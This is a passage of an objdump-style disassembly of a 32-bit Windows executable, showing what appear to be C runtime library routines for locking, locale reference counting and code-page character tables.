  403360:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  403367:	e8 09 00 00 00       	call   0x403375
  40336c:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  40336f:	e8 25 0c 00 00       	call   0x403f99
  403374:	c3                   	ret
  403375:	6a 0a                	push   $0xa
  403377:	e8 2a ff ff ff       	call   0x4032a6
  40337c:	59                   	pop    %ecx
  40337d:	c3                   	ret
  40337e:	55                   	push   %ebp
  40337f:	8b ec                	mov    %esp,%ebp
  403381:	8b 45 08             	mov    0x8(%ebp),%eax
  403384:	56                   	push   %esi
  403385:	8d 34 c5 60 c0 40 00 	lea    0x40c060(,%eax,8),%esi
  40338c:	83 3e 00             	cmpl   $0x0,(%esi)
  40338f:	75 13                	jne    0x4033a4
  403391:	50                   	push   %eax
  403392:	e8 24 ff ff ff       	call   0x4032bb
  403397:	85 c0                	test   %eax,%eax
  403399:	59                   	pop    %ecx
  40339a:	75 08                	jne    0x4033a4
  40339c:	6a 11                	push   $0x11
  40339e:	e8 02 f2 ff ff       	call   0x4025a5
  4033a3:	59                   	pop    %ecx
  4033a4:	ff 36                	push   (%esi)
  4033a6:	ff 15 ec 90 40 00    	call   *0x4090ec
  4033ac:	5e                   	pop    %esi
  4033ad:	5d                   	pop    %ebp
  4033ae:	c3                   	ret
  4033af:	53                   	push   %ebx
  4033b0:	55                   	push   %ebp
  4033b1:	56                   	push   %esi
  4033b2:	8b 74 24 10          	mov    0x10(%esp),%esi
  4033b6:	8b 86 bc 00 00 00    	mov    0xbc(%esi),%eax
  4033bc:	33 ed                	xor    %ebp,%ebp
  4033be:	3b c5                	cmp    %ebp,%eax
  4033c0:	57                   	push   %edi
  4033c1:	74 6f                	je     0x403432
  4033c3:	3d 80 cb 40 00       	cmp    $0x40cb80,%eax
  4033c8:	74 68                	je     0x403432
  4033ca:	8b 86 b0 00 00 00    	mov    0xb0(%esi),%eax
  4033d0:	3b c5                	cmp    %ebp,%eax
  4033d2:	74 5e                	je     0x403432
  4033d4:	39 28                	cmp    %ebp,(%eax)
  4033d6:	75 5a                	jne    0x403432
  4033d8:	8b 86 b8 00 00 00    	mov    0xb8(%esi),%eax
  4033de:	3b c5                	cmp    %ebp,%eax
  4033e0:	74 17                	je     0x4033f9
  4033e2:	39 28                	cmp    %ebp,(%eax)
  4033e4:	75 13                	jne    0x4033f9
  4033e6:	50                   	push   %eax
  4033e7:	e8 a3 f8 ff ff       	call   0x402c8f
  4033ec:	ff b6 bc 00 00 00    	push   0xbc(%esi)
  4033f2:	e8 a3 2e 00 00       	call   0x40629a
  4033f7:	59                   	pop    %ecx
  4033f8:	59                   	pop    %ecx
  4033f9:	8b 86 b4 00 00 00    	mov    0xb4(%esi),%eax
  4033ff:	3b c5                	cmp    %ebp,%eax
  403401:	74 17                	je     0x40341a
  403403:	39 28                	cmp    %ebp,(%eax)
  403405:	75 13                	jne    0x40341a
  403407:	50                   	push   %eax
  403408:	e8 82 f8 ff ff       	call   0x402c8f
  40340d:	ff b6 bc 00 00 00    	push   0xbc(%esi)
  403413:	e8 42 2e 00 00       	call   0x40625a
  403418:	59                   	pop    %ecx
  403419:	59                   	pop    %ecx
  40341a:	ff b6 b0 00 00 00    	push   0xb0(%esi)
  403420:	e8 6a f8 ff ff       	call   0x402c8f
  403425:	ff b6 bc 00 00 00    	push   0xbc(%esi)
  40342b:	e8 5f f8 ff ff       	call   0x402c8f
  403430:	59                   	pop    %ecx
  403431:	59                   	pop    %ecx
  403432:	8b 86 c0 00 00 00    	mov    0xc0(%esi),%eax
  403438:	3b c5                	cmp    %ebp,%eax
  40343a:	74 44                	je     0x403480
  40343c:	39 28                	cmp    %ebp,(%eax)
  40343e:	75 40                	jne    0x403480
  403440:	8b 86 c4 00 00 00    	mov    0xc4(%esi),%eax
  403446:	2d fe 00 00 00       	sub    $0xfe,%eax
  40344b:	50                   	push   %eax
  40344c:	e8 3e f8 ff ff       	call   0x402c8f
  403451:	8b 86 cc 00 00 00    	mov    0xcc(%esi),%eax
  403457:	bf 80 00 00 00       	mov    $0x80,%edi
  40345c:	2b c7                	sub    %edi,%eax
  40345e:	50                   	push   %eax
  40345f:	e8 2b f8 ff ff       	call   0x402c8f
  403464:	8b 86 d0 00 00 00    	mov    0xd0(%esi),%eax
  40346a:	2b c7                	sub    %edi,%eax
  40346c:	50                   	push   %eax
  40346d:	e8 1d f8 ff ff       	call   0x402c8f
  403472:	ff b6 c0 00 00 00    	push   0xc0(%esi)
  403478:	e8 12 f8 ff ff       	call   0x402c8f
  40347d:	83 c4 10             	add    $0x10,%esp
  403480:	8d be d4 00 00 00    	lea    0xd4(%esi),%edi
  403486:	8b 07                	mov    (%edi),%eax
  403488:	3d c0 ca 40 00       	cmp    $0x40cac0,%eax
  40348d:	74 17                	je     0x4034a6
  40348f:	39 a8 b4 00 00 00    	cmp    %ebp,0xb4(%eax)
  403495:	75 0f                	jne    0x4034a6
  403497:	50                   	push   %eax
  403498:	e8 2d 2c 00 00       	call   0x4060ca
  40349d:	ff 37                	push   (%edi)
  40349f:	e8 eb f7 ff ff       	call   0x402c8f
  4034a4:	59                   	pop    %ecx
  4034a5:	59                   	pop    %ecx
  4034a6:	6a 06                	push   $0x6
  4034a8:	8d 7e 50             	lea    0x50(%esi),%edi
  4034ab:	5b                   	pop    %ebx
  4034ac:	81 7f f8 88 c1 40 00 	cmpl   $0x40c188,-0x8(%edi)
  4034b3:	74 11                	je     0x4034c6
  4034b5:	8b 07                	mov    (%edi),%eax
  4034b7:	3b c5                	cmp    %ebp,%eax
  4034b9:	74 0b                	je     0x4034c6
  4034bb:	39 28                	cmp    %ebp,(%eax)
  4034bd:	75 07                	jne    0x4034c6
  4034bf:	50                   	push   %eax
  4034c0:	e8 ca f7 ff ff       	call   0x402c8f
  4034c5:	59                   	pop    %ecx
  4034c6:	39 6f fc             	cmp    %ebp,-0x4(%edi)
  4034c9:	74 12                	je     0x4034dd
  4034cb:	8b 47 04             	mov    0x4(%edi),%eax
  4034ce:	3b c5                	cmp    %ebp,%eax
  4034d0:	74 0b                	je     0x4034dd
  4034d2:	39 28                	cmp    %ebp,(%eax)
  4034d4:	75 07                	jne    0x4034dd
  4034d6:	50                   	push   %eax
  4034d7:	e8 b3 f7 ff ff       	call   0x402c8f
  4034dc:	59                   	pop    %ecx
  4034dd:	83 c7 10             	add    $0x10,%edi
  4034e0:	4b                   	dec    %ebx
  4034e1:	75 c9                	jne    0x4034ac
  4034e3:	56                   	push   %esi
  4034e4:	e8 a6 f7 ff ff       	call   0x402c8f
  4034e9:	59                   	pop    %ecx
  4034ea:	5f                   	pop    %edi
  4034eb:	5e                   	pop    %esi
  4034ec:	5d                   	pop    %ebp
  4034ed:	5b                   	pop    %ebx
  4034ee:	c3                   	ret
  4034ef:	53                   	push   %ebx
  4034f0:	55                   	push   %ebp
  4034f1:	56                   	push   %esi
  4034f2:	8b 74 24 10          	mov    0x10(%esp),%esi
  4034f6:	57                   	push   %edi
  4034f7:	8b 3d b4 90 40 00    	mov    0x4090b4,%edi
  4034fd:	56                   	push   %esi
  4034fe:	ff d7                	call   *%edi
  403500:	8b 86 b0 00 00 00    	mov    0xb0(%esi),%eax
  403506:	85 c0                	test   %eax,%eax
  403508:	74 03                	je     0x40350d
  40350a:	50                   	push   %eax
  40350b:	ff d7                	call   *%edi
  40350d:	8b 86 b8 00 00 00    	mov    0xb8(%esi),%eax
  403513:	85 c0                	test   %eax,%eax
  403515:	74 03                	je     0x40351a
  403517:	50                   	push   %eax
  403518:	ff d7                	call   *%edi
  40351a:	8b 86 b4 00 00 00    	mov    0xb4(%esi),%eax
  403520:	85 c0                	test   %eax,%eax
  403522:	74 03                	je     0x403527
  403524:	50                   	push   %eax
  403525:	ff d7                	call   *%edi
  403527:	8b 86 c0 00 00 00    	mov    0xc0(%esi),%eax
  40352d:	85 c0                	test   %eax,%eax
  40352f:	74 03                	je     0x403534
  403531:	50                   	push   %eax
  403532:	ff d7                	call   *%edi
  403534:	6a 06                	push   $0x6
  403536:	8d 5e 50             	lea    0x50(%esi),%ebx
  403539:	5d                   	pop    %ebp
  40353a:	81 7b f8 88 c1 40 00 	cmpl   $0x40c188,-0x8(%ebx)
  403541:	74 09                	je     0x40354c
  403543:	8b 03                	mov    (%ebx),%eax
  403545:	85 c0                	test   %eax,%eax
  403547:	74 03                	je     0x40354c
  403549:	50                   	push   %eax
  40354a:	ff d7                	call   *%edi
  40354c:	83 7b fc 00          	cmpl   $0x0,-0x4(%ebx)
  403550:	74 0a                	je     0x40355c
  403552:	8b 43 04             	mov    0x4(%ebx),%eax
  403555:	85 c0                	test   %eax,%eax
  403557:	74 03                	je     0x40355c
  403559:	50                   	push   %eax
  40355a:	ff d7                	call   *%edi
  40355c:	83 c3 10             	add    $0x10,%ebx
  40355f:	4d                   	dec    %ebp
  403560:	75 d8                	jne    0x40353a
  403562:	8b 86 d4 00 00 00    	mov    0xd4(%esi),%eax
  403568:	05 b4 00 00 00       	add    $0xb4,%eax
  40356d:	50                   	push   %eax
  40356e:	ff d7                	call   *%edi
  403570:	5f                   	pop    %edi
  403571:	5e                   	pop    %esi
  403572:	5d                   	pop    %ebp
  403573:	5b                   	pop    %ebx
  403574:	c3                   	ret
  403575:	56                   	push   %esi
  403576:	8b 74 24 08          	mov    0x8(%esp),%esi
  40357a:	85 f6                	test   %esi,%esi
  40357c:	74 7f                	je     0x4035fd
  40357e:	53                   	push   %ebx
  40357f:	55                   	push   %ebp
  403580:	57                   	push   %edi
  403581:	8b 3d c4 90 40 00    	mov    0x4090c4,%edi
  403587:	56                   	push   %esi
  403588:	ff d7                	call   *%edi
  40358a:	8b 86 b0 00 00 00    	mov    0xb0(%esi),%eax
  403590:	85 c0                	test   %eax,%eax
  403592:	74 03                	je     0x403597
  403594:	50                   	push   %eax
  403595:	ff d7                	call   *%edi
  403597:	8b 86 b8 00 00 00    	mov    0xb8(%esi),%eax
  40359d:	85 c0                	test   %eax,%eax
  40359f:	74 03                	je     0x4035a4
  4035a1:	50                   	push   %eax
  4035a2:	ff d7                	call   *%edi
  4035a4:	8b 86 b4 00 00 00    	mov    0xb4(%esi),%eax
  4035aa:	85 c0                	test   %eax,%eax
  4035ac:	74 03                	je     0x4035b1
  4035ae:	50                   	push   %eax
  4035af:	ff d7                	call   *%edi
  4035b1:	8b 86 c0 00 00 00    	mov    0xc0(%esi),%eax
  4035b7:	85 c0                	test   %eax,%eax
  4035b9:	74 03                	je     0x4035be
  4035bb:	50                   	push   %eax
  4035bc:	ff d7                	call   *%edi
  4035be:	6a 06                	push   $0x6
  4035c0:	8d 5e 50             	lea    0x50(%esi),%ebx
  4035c3:	5d                   	pop    %ebp
  4035c4:	81 7b f8 88 c1 40 00 	cmpl   $0x40c188,-0x8(%ebx)
  4035cb:	74 09                	je     0x4035d6
  4035cd:	8b 03                	mov    (%ebx),%eax
  4035cf:	85 c0                	test   %eax,%eax
  4035d1:	74 03                	je     0x4035d6
  4035d3:	50                   	push   %eax
  4035d4:	ff d7                	call   *%edi
  4035d6:	83 7b fc 00          	cmpl   $0x0,-0x4(%ebx)
  4035da:	74 0a                	je     0x4035e6
  4035dc:	8b 43 04             	mov    0x4(%ebx),%eax
  4035df:	85 c0                	test   %eax,%eax
  4035e1:	74 03                	je     0x4035e6
  4035e3:	50                   	push   %eax
  4035e4:	ff d7                	call   *%edi
  4035e6:	83 c3 10             	add    $0x10,%ebx
  4035e9:	4d                   	dec    %ebp
  4035ea:	75 d8                	jne    0x4035c4
  4035ec:	8b 86 d4 00 00 00    	mov    0xd4(%esi),%eax
  4035f2:	05 b4 00 00 00       	add    $0xb4,%eax
  4035f7:	50                   	push   %eax
  4035f8:	ff d7                	call   *%edi
  4035fa:	5f                   	pop    %edi
  4035fb:	5d                   	pop    %ebp
  4035fc:	5b                   	pop    %ebx
  4035fd:	8b c6                	mov    %esi,%eax
  4035ff:	5e                   	pop    %esi
  403600:	c3                   	ret
  403601:	85 ff                	test   %edi,%edi
  403603:	74 37                	je     0x40363c
  403605:	85 c0                	test   %eax,%eax
  403607:	74 33                	je     0x40363c
  403609:	56                   	push   %esi
  40360a:	8b 30                	mov    (%eax),%esi
  40360c:	3b f7                	cmp    %edi,%esi
  40360e:	74 28                	je     0x403638
  403610:	57                   	push   %edi
  403611:	89 38                	mov    %edi,(%eax)
  403613:	e8 d7 fe ff ff       	call   0x4034ef
  403618:	85 f6                	test   %esi,%esi
  40361a:	59                   	pop    %ecx
  40361b:	74 1b                	je     0x403638
  40361d:	56                   	push   %esi
  40361e:	e8 52 ff ff ff       	call   0x403575
  403623:	83 3e 00             	cmpl   $0x0,(%esi)
  403626:	59                   	pop    %ecx
  403627:	75 0f                	jne    0x403638
  403629:	81 fe 90 c1 40 00    	cmp    $0x40c190,%esi
  40362f:	74 07                	je     0x403638
  403631:	56                   	push   %esi
  403632:	e8 78 fd ff ff       	call   0x4033af
  403637:	59                   	pop    %ecx
  403638:	8b c7                	mov    %edi,%eax
  40363a:	5e                   	pop    %esi
  40363b:	c3                   	ret
  40363c:	33 c0                	xor    %eax,%eax
  40363e:	c3                   	ret
  40363f:	6a 0c                	push   $0xc
  403641:	68 70 ae 40 00       	push   $0x40ae70
  403646:	e8 09 09 00 00       	call   0x403f54
  40364b:	e8 98 ec ff ff       	call   0x4022e8
  403650:	8b f0                	mov    %eax,%esi
  403652:	a1 b4 cb 40 00       	mov    0x40cbb4,%eax
  403657:	85 46 70             	test   %eax,0x70(%esi)
  40365a:	74 22                	je     0x40367e
  40365c:	83 7e 6c 00          	cmpl   $0x0,0x6c(%esi)
  403660:	74 1c                	je     0x40367e
  403662:	e8 81 ec ff ff       	call   0x4022e8
  403667:	8b 70 6c             	mov    0x6c(%eax),%esi
  40366a:	85 f6                	test   %esi,%esi
  40366c:	75 08                	jne    0x403676
  40366e:	6a 20                	push   $0x20
  403670:	e8 30 ef ff ff       	call   0x4025a5
  403675:	59                   	pop    %ecx
  403676:	8b c6                	mov    %esi,%eax
  403678:	e8 1c 09 00 00       	call   0x403f99
  40367d:	c3                   	ret
  40367e:	6a 0c                	push   $0xc
  403680:	e8 f9 fc ff ff       	call   0x40337e
  403685:	59                   	pop    %ecx
  403686:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  40368a:	8d 46 6c             	lea    0x6c(%esi),%eax
  40368d:	8b 3d 68 c2 40 00    	mov    0x40c268,%edi
  403693:	e8 69 ff ff ff       	call   0x403601
  403698:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  40369b:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  4036a2:	e8 02 00 00 00       	call   0x4036a9
  4036a7:	eb c1                	jmp    0x40366a
  4036a9:	6a 0c                	push   $0xc
  4036ab:	e8 f6 fb ff ff       	call   0x4032a6
  4036b0:	59                   	pop    %ecx
  4036b1:	8b 75 e4             	mov    -0x1c(%ebp),%esi
  4036b4:	c3                   	ret
  4036b5:	2d a4 03 00 00       	sub    $0x3a4,%eax
  4036ba:	74 22                	je     0x4036de
  4036bc:	83 e8 04             	sub    $0x4,%eax
  4036bf:	74 17                	je     0x4036d8
  4036c1:	83 e8 0d             	sub    $0xd,%eax
  4036c4:	74 0c                	je     0x4036d2
  4036c6:	48                   	dec    %eax
  4036c7:	74 03                	je     0x4036cc
  4036c9:	33 c0                	xor    %eax,%eax
  4036cb:	c3                   	ret
  4036cc:	b8 04 04 00 00       	mov    $0x404,%eax
  4036d1:	c3                   	ret
  4036d2:	b8 12 04 00 00       	mov    $0x412,%eax
  4036d7:	c3                   	ret
  4036d8:	b8 04 08 00 00       	mov    $0x804,%eax
  4036dd:	c3                   	ret
  4036de:	b8 11 04 00 00       	mov    $0x411,%eax
  4036e3:	c3                   	ret
  4036e4:	53                   	push   %ebx
  4036e5:	55                   	push   %ebp
  4036e6:	56                   	push   %esi
  4036e7:	57                   	push   %edi
  4036e8:	bd 01 01 00 00       	mov    $0x101,%ebp
  4036ed:	8b f0                	mov    %eax,%esi
  4036ef:	55                   	push   %ebp
  4036f0:	33 ff                	xor    %edi,%edi
  4036f2:	8d 5e 1c             	lea    0x1c(%esi),%ebx
  4036f5:	57                   	push   %edi
  4036f6:	53                   	push   %ebx
  4036f7:	e8 64 e8 ff ff       	call   0x401f60
  4036fc:	89 7e 04             	mov    %edi,0x4(%esi)
  4036ff:	89 7e 08             	mov    %edi,0x8(%esi)
  403702:	89 7e 0c             	mov    %edi,0xc(%esi)
  403705:	33 c0                	xor    %eax,%eax
  403707:	8d 7e 10             	lea    0x10(%esi),%edi
  40370a:	ab                   	stos   %eax,%es:(%edi)
  40370b:	ab                   	stos   %eax,%es:(%edi)
  40370c:	ab                   	stos   %eax,%es:(%edi)
  40370d:	b8 78 c2 40 00       	mov    $0x40c278,%eax
  403712:	83 c4 0c             	add    $0xc,%esp
  403715:	2b c6                	sub    %esi,%eax
  403717:	8a 0c 18             	mov    (%eax,%ebx,1),%cl
  40371a:	88 0b                	mov    %cl,(%ebx)
  40371c:	43                   	inc    %ebx
  40371d:	4d                   	dec    %ebp
  40371e:	75 f7                	jne    0x403717
  403720:	8d 8e 1d 01 00 00    	lea    0x11d(%esi),%ecx
  403726:	be 00 01 00 00       	mov    $0x100,%esi
  40372b:	8a 14 01             	mov    (%ecx,%eax,1),%dl
  40372e:	88 11                	mov    %dl,(%ecx)
  403730:	41                   	inc    %ecx
  403731:	4e                   	dec    %esi
  403732:	75 f7                	jne    0x40372b
  403734:	5f                   	pop    %edi
  403735:	5e                   	pop    %esi
  403736:	5d                   	pop    %ebp
  403737:	5b                   	pop    %ebx
  403738:	c3                   	ret
  403739:	55                   	push   %ebp
  40373a:	8d ac 24 64 fb ff ff 	lea    -0x49c(%esp),%ebp
  403741:	81 ec 1c 05 00 00    	sub    $0x51c,%esp
  403747:	a1 20 c0 40 00       	mov    0x40c020,%eax
  40374c:	33 c5                	xor    %ebp,%eax
  40374e:	89 85 98 04 00 00    	mov    %eax,0x498(%ebp)
  403754:	53                   	push   %ebx
  403755:	57                   	push   %edi
  403756:	8d 45 84             	lea    -0x7c(%ebp),%eax
  403759:	50                   	push   %eax
  40375a:	ff 76 04             	push   0x4(%esi)
  40375d:	ff 15 f0 90 40 00    	call   *0x4090f0
  403763:	85 c0                	test   %eax,%eax
  403765:	bf 00 01 00 00       	mov    $0x100,%edi
  40376a:	0f 84 ef 00 00 00    	je     0x40385f
  403770:	33 c0                	xor    %eax,%eax
  403772:	88 84 05 98 03 00 00 	mov    %al,0x398(%ebp,%eax,1)
  403779:	40                   	inc    %eax
  40377a:	3b c7                	cmp    %edi,%eax
  40377c:	72 f4                	jb     0x403772
  40377e:	8a 45 8a             	mov    -0x76(%ebp),%al
  403781:	84 c0                	test   %al,%al
  403783:	c6 85 98 03 00 00 20 	movb   $0x20,0x398(%ebp)
  40378a:	74 2b                	je     0x4037b7
  40378c:	8d 5d 8b             	lea    -0x75(%ebp),%ebx
  40378f:	0f b6 c8             	movzbl %al,%ecx
  403792:	0f b6 03             	movzbl (%ebx),%eax
  403795:	3b c8                	cmp    %eax,%ecx
  403797:	77 16                	ja     0x4037af
  403799:	2b c1                	sub    %ecx,%eax
  40379b:	40                   	inc    %eax
  40379c:	50                   	push   %eax
  40379d:	8d 94 0d 98 03 00 00 	lea    0x398(%ebp,%ecx,1),%edx
  4037a4:	6a 20                	push   $0x20
  4037a6:	52                   	push   %edx
  4037a7:	e8 b4 e7 ff ff       	call   0x401f60
  4037ac:	83 c4 0c             	add    $0xc,%esp
  4037af:	43                   	inc    %ebx
  4037b0:	8a 03                	mov    (%ebx),%al
  4037b2:	43                   	inc    %ebx
  4037b3:	84 c0                	test   %al,%al
  4037b5:	75 d8                	jne    0x40378f
  4037b7:	6a 00                	push   $0x0
  4037b9:	ff 76 0c             	push   0xc(%esi)
  4037bc:	8d 45 98             	lea    -0x68(%ebp),%eax
  4037bf:	ff 76 04             	push   0x4(%esi)
  4037c2:	50                   	push   %eax
  4037c3:	57                   	push   %edi
  4037c4:	8d 85 98 03 00 00    	lea    0x398(%ebp),%eax
  4037ca:	50                   	push   %eax
  4037cb:	6a 01                	push   $0x1
  4037cd:	6a 00                	push   $0x0
  4037cf:	e8 7f 2f 00 00       	call   0x406753
  4037d4:	33 db                	xor    %ebx,%ebx
  4037d6:	53                   	push   %ebx
  4037d7:	ff 76 04             	push   0x4(%esi)
  4037da:	8d 85 98 02 00 00    	lea    0x298(%ebp),%eax
  4037e0:	57                   	push   %edi
  4037e1:	50                   	push   %eax
  4037e2:	57                   	push   %edi
  4037e3:	8d 85 98 03 00 00    	lea    0x398(%ebp),%eax
  4037e9:	50                   	push   %eax
  4037ea:	57                   	push   %edi
  4037eb:	ff 76 0c             	push   0xc(%esi)
  4037ee:	53                   	push   %ebx
  4037ef:	e8 8e 33 00 00       	call   0x406b82
  4037f4:	83 c4 44             	add    $0x44,%esp
  4037f7:	53                   	push   %ebx
  4037f8:	ff 76 04             	push   0x4(%esi)
  4037fb:	8d 85 98 01 00 00    	lea    0x198(%ebp),%eax
  403801:	57                   	push   %edi
  403802:	50                   	push   %eax
  403803:	57                   	push   %edi
  403804:	8d 85 98 03 00 00    	lea    0x398(%ebp),%eax
  40380a:	50                   	push   %eax
  40380b:	68 00 02 00 00       	push   $0x200
  403810:	ff 76 0c             	push   0xc(%esi)
  403813:	53                   	push   %ebx
  403814:	e8 69 33 00 00       	call   0x406b82
  403819:	83 c4 24             	add    $0x24,%esp
  40381c:	33 c0                	xor    %eax,%eax
  40381e:	0f b7 4c 45 98       	movzwl -0x68(%ebp,%eax,2),%ecx
  403823:	f6 c1 01             	test   $0x1,%cl
  403826:	74 0e                	je     0x403836
  403828:	80 4c 06 1d 10       	orb    $0x10,0x1d(%esi,%eax,1)
  40382d:	8a 8c 05 98 02 00 00 	mov    0x298(%ebp,%eax,1),%cl
  403834:	eb 11                	jmp    0x403847
  403836:	f6 c1 02             	test   $0x2,%cl
  403839:	74 15                	je     0x403850
  40383b:	80 4c 06 1d 20       	orb    $0x20,0x1d(%esi,%eax,1)
  403840:	8a 8c 05 98 01 00 00 	mov    0x198(%ebp,%eax,1),%cl
  403847:	88 8c 06 1d 01 00 00 	mov    %cl,0x11d(%esi,%eax,1)
  40384e:	eb 08                	jmp    0x403858
  403850:	c6 84 06 1d 01 00 00 	movb   $0x0,0x11d(%esi,%eax,1)
  403857:	00 
  403858:	40                   	inc    %eax
  403859:	3b c7                	cmp    %edi,%eax
  40385b:	72 c1                	jb     0x40381e
  40385d:	eb 4d                	jmp    0x4038ac
  40385f:	8d 86 1d 01 00 00    	lea    0x11d(%esi),%eax
  403865:	c7 45 80 9f ff ff ff 	movl   $0xffffff9f,-0x80(%ebp)
  40386c:	33 c9                	xor    %ecx,%ecx
  40386e:	29 45 80             	sub    %eax,-0x80(%ebp)
  403871:	8b 55 80             	mov    -0x80(%ebp),%edx
  403874:	8d 84 0e 1d 01 00 00 	lea    0x11d(%esi,%ecx,1),%eax
  40387b:	03 d0                	add    %eax,%edx
  40387d:	8d 5a 20             	lea    0x20(%edx),%ebx
  403880:	83 fb 19             	cmp    $0x19,%ebx
  403883:	77 0c                	ja     0x403891
  403885:	80 4c 0e 1d 10       	orb    $0x10,0x1d(%esi,%ecx,1)
  40388a:	8a d1                	mov    %cl,%dl
  40388c:	80 c2 20             	add    $0x20,%dl
  40388f:	eb 0f                	jmp    0x4038a0
  403891:	83 fa 19             	cmp    $0x19,%edx
  403894:	77 0e                	ja     0x4038a4
  403896:	80 4c 0e 1d 20       	orb    $0x20,0x1d(%esi,%ecx,1)
  40389b:	8a d1                	mov    %cl,%dl
  40389d:	80 ea 20             	sub    $0x20,%dl
  4038a0:	88 10                	mov    %dl,(%eax)
  4038a2:	eb 03                	jmp    0x4038a7
  4038a4:	c6 00 00             	movb   $0x0,(%eax)
  4038a7:	41                   	inc    %ecx
  4038a8:	3b cf                	cmp    %edi,%ecx
  4038aa:	72 c5                	jb     0x403871
  4038ac:	8b 8d 98 04 00 00    	mov    0x498(%ebp),%ecx
  4038b2:	5f                   	pop    %edi
  4038b3:	33 cd                	xor    %ebp,%ecx
  4038b5:	5b                   	pop    %ebx
  4038b6:	e8 1f e7 ff ff       	call   0x401fda
  4038bb:	81 c5 9c 04 00 00    	add    $0x49c,%ebp
  4038c1:	c9                   	leave
  4038c2:	c3                   	ret
  4038c3:	6a 0c                	push   $0xc
  4038c5:	68 90 ae 40 00       	push   $0x40ae90
  4038ca:	e8 85 06 00 00       	call   0x403f54
  4038cf:	e8 14 ea ff ff       	call   0x4022e8
  4038d4:	8b f8                	mov    %eax,%edi
  4038d6:	a1 b4 cb 40 00       	mov    0x40cbb4,%eax
  4038db:	85 47 70             	test   %eax,0x70(%edi)
  4038de:	74 1d                	je     0x4038fd
  4038e0:	83 7f 6c 00          	cmpl   $0x0,0x6c(%edi)
  4038e4:	74 17                	je     0x4038fd
  4038e6:	8b 77 68             	mov    0x68(%edi),%esi
  4038e9:	85 f6                	test   %esi,%esi
  4038eb:	75 08                	jne    0x4038f5
  4038ed:	6a 20                	push   $0x20
  4038ef:	e8 b1 ec ff ff       	call   0x4025a5
  4038f4:	59                   	pop    %ecx
  4038f5:	8b c6                	mov    %esi,%eax
  4038f7:	e8 9d 06 00 00       	call   0x403f99
  4038fc:	c3                   	ret
  4038fd:	6a 0d                	push   $0xd
  4038ff:	e8 7a fa ff ff       	call   0x40337e
  403904:	59                   	pop    %ecx
  403905:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  403909:	8b 77 68             	mov    0x68(%edi),%esi
  40390c:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  40390f:	3b 35 a0 c6 40 00    	cmp    0x40c6a0,%esi
  403915:	74 36                	je     0x40394d
  403917:	85 f6                	test   %esi,%esi
  403919:	74 1a                	je     0x403935
  40391b:	56                   	push   %esi
  40391c:	ff 15 c4 90 40 00    	call   *0x4090c4
  403922:	85 c0                	test   %eax,%eax
  403924:	75 0f                	jne    0x403935
  403926:	81 fe 78 c2 40 00    	cmp    $0x40c278,%esi
  40392c:	74 07                	je     0x403935
  40392e:	56                   	push   %esi
  40392f:	e8 5b f3 ff ff       	call   0x402c8f
  403934:	59                   	pop    %ecx
  403935:	a1 a0 c6 40 00       	mov    0x40c6a0,%eax
  40393a:	89 47 68             	mov    %eax,0x68(%edi)
  40393d:	8b 35 a0 c6 40 00    	mov    0x40c6a0,%esi
  403943:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  403946:	56                   	push   %esi
  403947:	ff 15 b4 90 40 00    	call   *0x4090b4
  40394d:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  403954:	e8 05 00 00 00       	call   0x40395e
  403959:	eb 8e                	jmp    0x4038e9
  40395b:	8b 75 e4             	mov    -0x1c(%ebp),%esi
  40395e:	6a 0d                	push   $0xd
  403960:	e8 41 f9 ff ff       	call   0x4032a6
  403965:	59                   	pop    %ecx
  403966:	c3                   	ret
  403967:	8b 44 24 04          	mov    0x4(%esp),%eax
  40396b:	85 c0                	test   %eax,%eax
  40396d:	56                   	push   %esi
  40396e:	8b f1                	mov    %ecx,%esi
  403970:	c6 46 0c 00          	movb   $0x0,0xc(%esi)
  403974:	75 63                	jne    0x4039d9
  403976:	e8 6d e9 ff ff       	call   0x4022e8
  40397b:	89 46 08             	mov    %eax,0x8(%esi)
  40397e:	8b 48 6c             	mov    0x6c(%eax),%ecx
  403981:	89 0e                	mov    %ecx,(%esi)
  403983:	8b 48 68             	mov    0x68(%eax),%ecx
  403986:	89 4e 04             	mov    %ecx,0x4(%esi)
  403989:	8b 0e                	mov    (%esi),%ecx
  40398b:	3b 0d 68 c2 40 00    	cmp    0x40c268,%ecx
  403991:	74 12                	je     0x4039a5
  403993:	8b 0d b4 cb 40 00    	mov    0x40cbb4,%ecx
  403999:	85 48 70             	test   %ecx,0x70(%eax)
  40399c:	75 07                	jne    0x4039a5
  40399e:	e8 9c fc ff ff       	call   0x40363f
  4039a3:	89 06                	mov    %eax,(%esi)
  4039a5:	8b 46 04             	mov    0x4(%esi),%eax
  4039a8:	3b 05 a0 c6 40 00    	cmp    0x40c6a0,%eax
  4039ae:	74 16                	je     0x4039c6
  4039b0:	8b 46 08             	mov    0x8(%esi),%eax
  4039b3:	8b 0d b4 cb 40 00    	mov    0x40cbb4,%ecx
  4039b9:	85 48 70             	test   %ecx,0x70(%eax)
  4039bc:	75 08                	jne    0x4039c6
  4039be:	e8 00 ff ff ff       	call   0x4038c3
  4039c3:	89 46 04             	mov    %eax,0x4(%esi)
  4039c6:	8b 46 08             	mov    0x8(%esi),%eax
  4039c9:	f6 40 70 02          	testb  $0x2,0x70(%eax)
  4039cd:	75 14                	jne    0x4039e3
  4039cf:	83 48 70 02          	orl    $0x2,0x70(%eax)
  4039d3:	c6 46 0c 01          	movb   $0x1,0xc(%esi)
  4039d7:	eb 0a                	jmp    0x4039e3
  4039d9:	8b 08                	mov    (%eax),%ecx
  4039db:	89 0e                	mov    %ecx,(%esi)
  4039dd:	8b 40 04             	mov    0x4(%eax),%eax
  4039e0:	89 46 04             	mov    %eax,0x4(%esi)
  4039e3:	8b c6                	mov    %esi,%eax
  4039e5:	5e                   	pop    %esi
  4039e6:	c2 04 00             	ret    $0x4
  4039e9:	55                   	push   %ebp
  4039ea:	8b ec                	mov    %esp,%ebp
  4039ec:	83 ec 10             	sub    $0x10,%esp
  4039ef:	53                   	push   %ebx
  4039f0:	33 db                	xor    %ebx,%ebx
  4039f2:	53                   	push   %ebx
  4039f3:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  4039f6:	e8 6c ff ff ff       	call   0x403967
